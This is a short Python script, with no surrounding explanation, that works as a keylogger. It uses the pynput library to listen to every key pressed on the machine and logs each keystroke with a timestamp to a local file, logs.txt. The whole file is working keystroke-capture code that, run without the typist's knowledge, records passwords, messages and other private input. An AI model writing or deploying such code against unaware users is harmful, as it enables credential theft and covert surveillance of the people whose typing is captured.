from pynput.keyboard import Listener
import logging

logging.basicConfig(
    filename=("logs.txt"),
    level = logging.DEBUG, format="%(asctime)s: %(message)s"
)

def onPress(key):
    logging.info(str(key).strip("<>"))

with Listener(on_press=onPress) as listener:
    listener.join()